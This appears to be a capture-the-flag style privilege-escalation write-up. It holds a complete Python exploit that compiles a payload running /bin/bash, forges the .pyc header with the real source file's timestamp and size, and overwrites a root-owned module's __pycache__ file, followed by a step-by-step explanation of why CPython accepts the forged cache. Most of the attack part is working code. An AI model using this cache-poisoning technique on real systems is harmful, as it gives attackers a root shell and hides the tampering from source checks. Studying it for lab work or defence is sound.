```
import py_compile
import struct

# Paths
TARGET_SOURCE = "/opt/extensiontool/extension_utils.py"
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

print("[*] Compiling malicious payload...")
with open("/tmp/malicious.py", "w") as f:
    f.write(malicious_code)


py_compile.compile("/tmp/malicious.py", cfile="/tmp/malicious.pyc")

# 3. Read the stats of the ORIGINAL root-owned source file
print("[*] Reading stats from original source file...")
stats = os.stat(TARGET_SOURCE)
original_mtime = int(stats.st_mtime) # Timestamp (4 bytes)
original_size = stats.st_size        # File Size (4 bytes)

print(f"    Target Mtime: {original_mtime}")
print(f"    Target Size:  {original_size}")


# [4 bytes Magic] [4 bytes Flags] [4 bytes Timestamp] [4 bytes Size]
print("[*] Patching .pyc header...")
with open("/tmp/malicious.pyc", "r+b") as f:
    # Seek to offset 8 (Timestamp position)
    f.seek(8)
    # Write the stolen timestamp and size into the header
    # '<II' means Little-Endian, two Unsigned Integers
    f.write(struct.pack('<II', original_mtime, original_size))

# 5. Overwrite the target file

with open("/tmp/malicious.pyc", "rb") as src, open(TARGET_PYC, "wb") as dst:
    dst.write(src.read())
```

### Step-by-Step Breakdown

#### 1. The Malicious Payload

```python
malicious_code = """
import os
os.system("/bin/bash")
"""
```

Simple — spawns a bash shell. When executed as root, that's a root shell.

---

#### 2. Compiling to Bytecode


```python
py_compile.compile("/tmp/malicious.py", cfile="/tmp/malicious.pyc")
```

Python can't just drop raw `.py` code into a cache — it needs a proper `.pyc` file with a valid header. This produces a legitimate `.pyc` structure.

---

#### 3. Stealing the Header Metadata


```python
stats = os.stat(TARGET_SOURCE)
original_mtime = int(stats.st_mtime)
original_size = stats.st_size
```

This is the **key trick**. Python validates `.pyc` files using the source file's **modification timestamp** and **file size**. If these don't match, Python ignores the cache and recompiles from source — which would blow your cover.

So you **steal the real values** from the legitimate source file.

---

#### 4. Patching the .pyc Header


```python
f.seek(8)
f.write(struct.pack('<II', original_mtime, original_size))
```

A CPython 3.x `.pyc` header looks like this:

|Offset|Size|Field|
|---|---|---|
|0|4 bytes|Magic number (Python version identifier)|
|4|4 bytes|Flags|
|8|4 bytes|**Timestamp** ← patched here|
|12|4 bytes|**Source size** ← patched here|
|16+|...|Marshalled bytecode|

By seeking to offset 8 and writing the stolen values with `struct.pack('<II', ...)` (little-endian, two unsigned ints), you make Python believe this `.pyc` is a **valid, up-to-date cache** of the original source.

---

#### 5. Overwriting the Cache


````python
with open("/tmp/malicious.pyc", "rb") as src, open(TARGET_PYC, "wb") as dst:
    dst.write(src.read())
```
Drops your patched malicious `.pyc` into the `__pycache__` directory. This requires **write permission** to that directory — which is the privilege condition this box likely sets up (e.g., a misconfigured group, sticky bit, or weak ACL).

---
````
